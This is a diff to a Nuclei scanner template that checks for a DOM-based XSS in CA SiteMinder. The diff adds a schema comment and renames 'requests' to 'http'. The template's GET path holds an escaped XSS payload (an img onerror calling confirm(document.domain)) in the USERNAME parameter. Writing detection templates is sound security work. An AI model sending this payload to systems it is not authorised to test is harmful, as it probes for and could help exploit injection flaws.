@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: siteminder-dom-based-xss
 info:
   name: SiteMinder DOM BASED XSS
@@ -6,7 +7,7 @@ info:
   description: SiteMinder DOM Based XSS.
   tags: dom,xss
   reference: https://blog.reigningshells.com/2019/12/reviving-old-cves-reflected-xss-in-ca.html
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7'
